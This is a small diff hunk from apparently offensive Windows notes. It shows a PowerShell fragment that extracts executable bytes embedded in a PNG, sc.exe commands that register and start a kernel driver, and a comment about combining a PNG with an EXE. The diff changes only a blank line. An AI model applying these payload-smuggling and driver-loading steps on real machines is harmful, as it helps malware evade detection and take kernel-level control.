@@ -12,6 +12,7 @@ $b=[IO.File]::ReadAllBytes("C:\Users\user\Desktop\output.png");$t=[byte[]](0x4D,
 ```
 # simple load of kernel driver 
 sc.exe create KernelName type= kernel binPath= "C:\Users\user\Desktop\kernel.sys"
+
 sc.exe start KernelName
 
 # combine png and exe
